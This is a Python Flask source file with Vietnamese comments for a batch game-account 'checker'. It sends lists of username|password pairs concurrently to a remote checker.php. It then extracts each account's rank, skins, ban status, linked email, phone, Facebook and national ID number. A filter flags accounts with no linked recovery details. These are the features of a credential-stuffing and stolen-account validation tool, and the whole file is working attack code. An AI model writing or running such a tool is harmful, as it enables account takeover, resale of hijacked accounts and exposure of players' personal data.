# app.py
import os, json, time, re
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests

# ========= CẤU HÌNH =========
# Ví dụ: https://yourserver.com/checker.php
SERVER2_URL = os.getenv("SERVER2_URL", "https://game.vtee.store/checker.php")
MAX_WORKERS = int(os.getenv("MAX_WORKERS", "10"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "15"))

app = Flask(__name__, static_folder="public", static_url_path="/")
CORS(app)

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Checker/1.0)",
    "Accept": "application/json, text/plain, */*"
})

# ========= TIỆN ÍCH =========
def clean_json_like(raw: str) -> str | None:
    if not raw: return None
    for marker in [
        '=== FULL API RESPONSE DEBUG ===',
        '=== DEBUG ===',
        'HTTP Code:',
        'Raw Response:',
        'Decoded Response:'
    ]:
        idx = raw.find(marker)
        if idx != -1:
            raw = raw[:idx].strip()
            break
    start = raw.find('{'); end = raw.rfind('}')
    if start != -1 and end != -1 and end > start:
        return raw[start:end+1].strip()
    return None

def safe_parse_json(resp: requests.Response):
    ctype = (resp.headers.get("Content-Type") or "").lower()
    text = resp.text or ""
    if "application/json" in ctype:
        try:
            return resp.json(), text
        except Exception:
            pass
    cleaned = clean_json_like(text)
    if cleaned:
        try:
            return json.loads(cleaned), text
        except Exception:
            pass
    return None, text

def parse_server2_data(data_in: dict | str) -> dict:
    """
    Chuẩn hoá về 1 cấu trúc thống nhất giống JS:
    username,password,name,rank,level,tuong,skin,band,email,ttemail,authen,sdt,fb,qh,lsnap,cmnd,
    acc_country,tt,ss,sss,anime,listskinss,listskinsss,listskinanime,sssanime
    """
    result = {
        "username":"", "password":"", "name":"", "rank":"", "level":"",
        "tuong":"", "skin":"", "band":"", "email":"", "ttemail":"", "authen":"",
        "sdt":"", "fb":"", "qh":"", "lsnap":"", "cmnd":"", "acc_country":"",
        "tt":"", "ss":"0", "sss":"0", "anime":"0",
        "listskinss":"", "listskinsss":"", "listskinanime":"", "sssanime":""
    }

    # Server 2 thường trả JSON object trong field data
    if isinstance(data_in, dict):
        # MAPPING mềm (có gì lấy nấy)
        def get(k, default=""):
            v = data_in.get(k)
            return str(v) if v is not None else default

        result["username"] = get("username")
        result["password"] = get("password")
        result["name"]     = get("name")
        result["rank"]     = get("rank")
        result["level"]    = get("level")
        result["tuong"]    = get("tuong") or get("hero")
        result["skin"]     = get("skin")
        result["band"]     = get("band") or get("ban")
        result["email"]    = get("email")
        result["ttemail"]  = get("ttemail")
        result["authen"]   = get("authen")
        result["sdt"]      = get("sdt")
        result["fb"]       = get("fb")
        result["qh"]       = get("qh") or get("so")
        result["lsnap"]    = get("lsnap") or get("login")
        result["cmnd"]     = get("cmnd")
        result["acc_country"] = get("acc_country") or get("quocgia")
        result["tt"]       = get("tt")
        result["ss"]       = get("ss","0")
        result["sss"]      = get("sss","0")
        result["anime"]    = get("anime","0")
        result["listskinss"]    = get("listskinss") or get("listss")
        result["listskinsss"]   = get("listskinsss") or get("listsss")
        result["listskinanime"] = get("listskinanime") or get("listanime")
        result["sssanime"]      = get("sssanime","0")
        return result

    # Fallback nếu data là chuỗi (ít gặp ở server 2)
    s = str(data_in)
    acc_match = re.search(r"^([^|:]+)[|:]([^|:]+)", s)
    if acc_match:
        result["username"] = acc_match.group(1).strip()
        result["password"] = acc_match.group(2).strip()

    def pick(pattern, default=""):
        m = re.search(pattern, s, flags=re.I)
        return m.group(1).strip() if m else default

    result["name"]   = pick(r"NAME\s*:\s*([^|]+)")
    result["rank"]   = pick(r"RANK\s*:\s*([^|]+)")
    result["level"]  = pick(r"LEVEL\s*:\s*([^|]+)")
    result["tuong"]  = pick(r"HERO\s*:\s*([^|]+)")
    result["skin"]   = pick(r"SKIN\s*:\s*([^|]+)")
    result["band"]   = pick(r"BAN\s*:\s*([^|]+)")
    result["email"]  = pick(r"EMAIL\s*:\s*([^|]+)")
    result["sdt"]    = pick(r"SDT\s*:\s*([^|]+)")
    result["cmnd"]   = pick(r"CMND\s*:\s*([^|]+)")
    result["authen"] = pick(r"AUTHEN\s*:\s*([^|]+)")
    result["fb"]     = pick(r"FB\s*:\s*([^|]+)")
    result["qh"]     = pick(r"SÒ\s*:\s*([^|]+)")
    result["acc_country"] = pick(r"QUỐC GIA\s*:\s*([^|]+)")
    result["lsnap"]  = pick(r"LOGIN LẦN CUỐI\s*:\s*([^|]+)")
    result["tt"]     = pick(r"TRẠNG THÁI\s*:\s*([^|]+)")
    # SS/SSS/ANIME dạng: SS : 2 [list...]
    ss_m   = re.search(r"SS\s*:\s*(\d+)\s*\[([^\]]*)\]", s, flags=re.I)
    sss_m  = re.search(r"SSS\s*:\s*(\d+)\s*\[([^\]]*)\]", s, flags=re.I)
    ani_m  = re.search(r"ANIME\s*:\s*(\d+)\s*\[([^\]]*)\]", s, flags=re.I)
    if ss_m:  result["ss"], result["listskinss"] = ss_m.group(1), ss_m.group(2)
    if sss_m: result["sss"], result["listskinsss"] = sss_m.group(1), sss_m.group(2)
    if ani_m: result["anime"], result["listskinanime"] = ani_m.group(1), ani_m.group(2)
    return result

def check_ttt_status(parsed: dict) -> bool:
    sdt = (parsed.get("sdt") or "").upper()
    ttemail = (parsed.get("ttemail") or "").upper()
    fb = (parsed.get("fb") or "").upper()
    sdt_not = (sdt in ("", "NO", "CHƯA LIÊN KẾT"))
    email_not = (ttemail in ("", "NO", "CHƯA LIÊN KẾT") or "CHƯA" in ttemail)
    fb_not = (fb in ("", "NO", "DIE", "CHƯA LIÊN KẾT"))
    return sdt_not and email_not and fb_not

def format_line(parsed: dict) -> str:
    return (
        f'{parsed["username"]}|{parsed["password"]} | TÊN : {parsed["name"]} | RANK : {parsed["rank"]} '
        f'| LEVEL : {parsed["level"]} | SỐ TƯỚNG : {parsed["tuong"]} | SKIN : {parsed["skin"]} '
        f'| TÀI KHOẢN ĐÃ BAN CHƯA : {parsed["band"]} | EMAIL : {parsed["email"]} | SDT : {parsed["sdt"]} | CMND : {parsed["cmnd"]} '
        f'| AUTHEN : {parsed["authen"]} | FB : {parsed["fb"]} | SỐ QUÂN HUY : {parsed["qh"]} | QUỐC GIA : {parsed["acc_country"]} '
        f'| LOGIN LẦN CUỐI : {parsed["lsnap"]} | SKIN SS : {parsed["ss"]} [{parsed.get("listskinss","")}] '
        f'| SKIN SSS : {parsed["sss"]} [{parsed.get("listskinsss","")}] | SKIN ANIME : {parsed["anime"]} [{parsed.get("listskinanime","")}] '
        f'| TRẠNG THÁI : {parsed["tt"]}'
    )

# ========= API =========
@app.route("/")
def index():
    return send_from_directory("public", "index.html")

@app.route("/api/ping")
def api_ping():
    # gọi /checker.php?test=ping
    t0 = time.time()
    try:
        r = session.get(SERVER2_URL, params={"test":"ping"}, timeout=REQUEST_TIMEOUT)
        ok = r.ok
        ms = int((time.time()-t0)*1000)
        return jsonify({"ok": ok, "ms": ms, "http": r.status_code})
    except requests.RequestException as e:
        ms = int((time.time()-t0)*1000)
        return jsonify({"ok": False, "ms": ms, "error": str(e)}), 200

@app.route("/api/check", methods=["GET"])
def api_check_one():
    username = request.args.get("account","").strip()
    password = request.args.get("password","").strip()
    if not username or not password:
        return jsonify({"status":"error","message":"Thiếu account/password"}), 400
    try:
        r = session.get(SERVER2_URL, params={"account":username,"password":password}, timeout=REQUEST_TIMEOUT)
        data, raw = safe_parse_json(r)
        if not data:
            return jsonify({"status":"error","message":"Phản hồi không phải JSON","raw":raw[:1000]}), 200

        # Server 2 chuẩn: { status: 'success'|'error', data: {...} }
        if str(data.get("status")).lower() == "success" and data.get("data"):
            parsed = parse_server2_data(data["data"])
            return jsonify({"status":"success","data":parsed}), 200
        else:
            # lỗi phía server 2
            return jsonify({"status":"error","message": data.get("data") or data.get("message") or "Unknown error"}), 200
    except requests.RequestException as e:
        return jsonify({"status":"error","message": str(e)}), 200

@app.route("/api/check-batch", methods=["POST"])
def api_check_batch():
    """
    Body JSON:
    {
      "lines": "tk1|mk1\ntk2|mk2\n...",
      "filter_band": false,
      "filter_ttt": false,
      "concurrency": 10
    }
    """
    body = request.get_json(silent=True) or {}
    lines = (body.get("lines") or "").splitlines()
    filter_band = bool(body.get("filter_band", False))
    filter_ttt  = bool(body.get("filter_ttt", False))
    concurrency = min(int(body.get("concurrency", MAX_WORKERS)), MAX_WORKERS)

    # chuẩn hoá tk|mk + loại rác
    accs = []
    for ln in lines:
        ln = ln.strip()
        if not ln or ln.startswith(("#","//","*")): continue
        if not re.match(r"^[^|:\s]+[|:][^|:\s]+$", ln): continue
        ln = ln.replace(":", "|")
        accs.append(ln)
    accs = list(dict.fromkeys(accs))  # unique

    results, errors, warnings, ttt_list = [], [], [], []

    def work(acc: str):
        u, p = acc.split("|", 1)
        try:
            r = session.get(SERVER2_URL, params={"account":u,"password":p}, timeout=REQUEST_TIMEOUT)
            data, raw = safe_parse_json(r)
            if not data:
                return ("warning", f"{u}|{p}|Not JSON")
            if str(data.get("status")).lower() == "success" and data.get("data"):
                parsed = parse_server2_data(data["data"])
                band = (parsed.get("band") or "").upper()
                is_ttt = check_ttt_status(parsed)
                if filter_band and band in ("YES","BAN"):
                    return ("error", f"{u}|{p}|acc bị band")
                if filter_ttt and is_ttt:
                    return ("ttt", format_line(parsed))
                return ("ok", format_line(parsed))
            else:
                msg = data.get("data") or data.get("message") or "Unknown error"
                return ("error", f"{u}|{p}|{msg}")
        except Exception as e:
            return ("warning", f"{u}|{p}|{e}")

    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futs = [ex.submit(work, a) for a in accs]
        for f in as_completed(futs):
            typ, payload = f.result()
            if typ == "ok": results.append(payload)
            elif typ == "error": errors.append(payload)
            elif typ == "ttt": ttt_list.append(payload)
            else: warnings.append(payload)

    return jsonify({
        "status":"success",
        "total": len(accs),
        "success": len(results),
        "errors": len(errors),
        "warnings": len(warnings),
        "ttt": len(ttt_list),
        "data": {
            "results": results,
            "errors": errors,
            "warnings": warnings,
            "ttt_list": ttt_list
        }
    }), 200

if __name__ == "__main__":
    # Chạy:  python app.py
    # Hoặc:  SERVER2_URL="https://yourserver.com/checker.php" python app.py
    app.run(host="0.0.0.0", port=8000, debug=True)
